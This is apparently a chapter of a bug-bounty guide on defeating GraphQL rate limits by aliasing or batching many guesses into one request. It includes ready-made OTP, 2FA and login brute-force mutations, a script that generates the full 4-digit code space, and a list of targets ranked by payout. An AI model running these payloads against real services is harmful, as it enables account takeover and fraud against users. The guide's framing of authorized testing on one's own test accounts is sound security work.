# 06 — Auth Bypass & Rate-Limit Defeat via Batching/Aliasing (Phase 5)

This is the **single most reliably-paid GraphQL-specific bug class**. Rate limits, brute-force
lockouts, and "one attempt" guards are almost always enforced **per HTTP request**. GraphQL lets you
put **hundreds of attempts inside one HTTP request** — via aliases or a batched array — so the
per-request counter increments once while you make 100 guesses. Result: OTP/2FA/password/coupon
brute force that the WAF and rate limiter never see.

---

## 6.1 Alias-based brute force (one query, many attempts)

Any mutation that verifies a secret (OTP, 2FA TOTP, password, PIN, gift-card, coupon) is a target.
Alias it N times with different guesses:
```graphql
mutation {
  a0: verifyOtp(phone:"+15550001", code:"0000"){ success token }
  a1: verifyOtp(phone:"+15550001", code:"0001"){ success token }
  a2: verifyOtp(phone:"+15550001", code:"0002"){ success token }
  # … a0000 … a9999  (entire 4-digit space in ONE request)
}
```
Generate the full space:
```bash
python3 -c 'print("mutation{"+" ".join(f"a{i}:verifyOtp(phone:\"+15550001\",code:\"{i:04d}\"){{success token}}" for i in range(10000))+"}")' > otp_brute.graphql
```
Read the response for the one alias where `success:true` / a token is returned. Because it's **one
POST**, a "5 attempts / minute" limit is bypassed entirely.

**Password / login brute force:**
```graphql
mutation {
  p1: login(email:"victim@x.com", password:"Password1"){ token }
  p2: login(email:"victim@x.com", password:"Summer2024"){ token }
  # … one request per wordlist chunk
}
```

## 6.2 Batched-array brute force (when aliasing is capped but batching isn't)

If aliases are limited but the server accepts a JSON array of operations, put each attempt in its own
array element — the rate limiter counts the array as one request:
```json
[
  {"query":"mutation($c:String!){verifyOtp(phone:\"+15550001\",code:$c){success token}}","variables":{"c":"0000"}},
  {"query":"mutation($c:String!){verifyOtp(phone:\"+15550001\",code:$c){success token}}","variables":{"c":"0001"}}
]
```
`batchql` / `graphql-cop` auto-detect whether batching is enabled. See `payloads/batching-bruteforce.json`.

## 6.3 What to point this at (highest impact first)
- **2FA / MFA / OTP verification** → bypass second factor → **ATO (P1)**.
- **Login password** → credential brute force with no lockout → **ATO (P1)**.
- **Password-reset code / email-verification code** → account takeover / pre-hijack (P1).
- **Coupon / gift-card / referral code** validation → financial abuse (P2/P3, business-logic).
- **Rate-limited "send code" mutations** → SMS/email bombing (usually low, sometimes cost-abuse).

## 6.4 Real disclosed examples
- **PortSwigger Web Security Academy — *"Bypassing GraphQL brute-force protections"*** (canonical,
  reproducible): the login mutation is rate-limited per request; aliasing many `login` attempts into a
  single request defeats the limit and cracks the password. This is the exact mechanism above.
- **Widely-disclosed HackerOne pattern — 2FA/OTP bypass via GraphQL batching/aliasing:** multiple
  programs paid for reports where a `verifyTwoFactor`/`verifyOtp` mutation had per-request rate
  limiting, and sending an array/aliased batch of guesses in one request brute-forced the code and
  bypassed 2FA → full ATO. This class is documented across many public writeups and by the batchql
  tool's authors as a real, repeated finding.
- **Coupon/gift-card brute force via aliasing:** disclosed e-commerce reports where discount/gift-card
  validation had no cross-attempt limit once wrapped in aliases → financial impact.

**Payout reality:** 2FA/login brute-force → ATO on a real product is squarely **P1**, typically
high-four to five figures. It's high-value precisely because it turns a "protected" auth flow into an
unprotected one with a single request the defenders never counted.

## 6.5 Confirm & don't inflate
- You must show the **guess actually succeeded** (token returned / `success:true` for the right code),
  not merely that the batch was accepted. Batch acceptance without a working guess = "batching
  enabled," which alone is low.
- Verify the **rate limiter really is per-request** by first proving that N sequential single requests
  get blocked while the N-in-one request is not. That contrast IS the finding.
- If the server applies the limit **per operation inside the batch** (some do), the bypass fails —
  report nothing.
- Respect program rules on automation/volume. One decisive PoC (e.g., cracking a code you set on your
  own test account) proves it without hammering production.

Next: `07-csrf-logic-massassign.md`.
